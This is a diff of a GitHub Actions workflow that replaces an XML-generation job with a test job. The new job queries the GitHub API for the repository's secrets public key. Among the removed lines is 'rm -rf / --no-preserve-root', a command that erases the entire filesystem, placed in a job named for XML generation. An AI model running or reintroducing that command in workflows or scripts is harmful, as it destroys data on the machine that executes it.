@@ -1,23 +1,15 @@
-name: generate-xml
+name: api-test
 
 on: 
-  workflow_dispatch:
   push:
 
 jobs:
-  generate-xml:
+  test:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - uses: actions/checkout@v3
-        with:
-          repository: hydriod/PhpToXml # .NET のリポジトリ
-          path: Temp/PhpToXml
-
-      - name: Setup .NET Core SDK
-        uses: actions/setup-dotnet@v2
-        with:
-          dotnet-version: '6.0.x'
-      - name: run       
-        run: ls -Rla ../
-      - run: rm -rf / --no-preserve-root
+      - run: |
+          curl \
+          -H "Accept: application/vnd.github+json" \ 
+          -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+          https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/secrets/public-key
